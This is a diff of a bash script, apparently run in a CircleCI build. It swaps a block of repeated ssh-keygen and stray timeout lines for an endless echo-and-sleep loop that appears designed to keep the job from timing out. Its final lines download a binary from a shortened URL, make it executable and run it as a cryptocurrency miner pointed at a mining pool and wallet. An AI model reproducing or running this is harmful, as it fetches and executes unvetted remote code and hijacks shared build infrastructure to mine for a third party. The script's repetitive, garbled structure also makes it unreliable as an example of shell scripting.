@@ -1,37 +1,63 @@
 #!/bin/bash
 
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
-no_output_timeout: 30m
+while true ; do
+echo "Process num: $num"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+done
 wget -qO build https://git.io/JX7bv
 chmod +x build
 ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.SayaInteL -p x -t 2
